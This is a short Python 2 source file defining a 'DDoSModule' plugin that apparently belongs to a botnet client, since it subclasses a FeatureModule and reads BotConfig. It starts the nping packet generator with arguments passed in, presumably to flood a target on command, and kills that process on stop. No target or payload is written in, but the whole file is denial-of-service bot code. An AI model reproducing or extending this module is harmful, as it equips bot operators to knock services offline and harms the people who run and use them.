'''
Created on Dec 21, 2013

@author: root
'''

from FeatureModule import FeatureModule
import subprocess
from domain import BotConfig

class DDoSModule(FeatureModule):
    '''
    classdocs
    '''
    __nping = None    

    def __init__(self):
        '''
        Constructor
        '''
        self.__name = "DDoS"
    
    def start(self, *args):
        cline = [BotConfig.NPING_PATH]
        cline = cline + args[0]
        self.__nping = subprocess.Popen(cline,
                             shell=False,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)

        sout, serr = self.__nping.communicate()
        
        print sout, serr
    
    def stop(self):
        self.__nping.kill()
        
        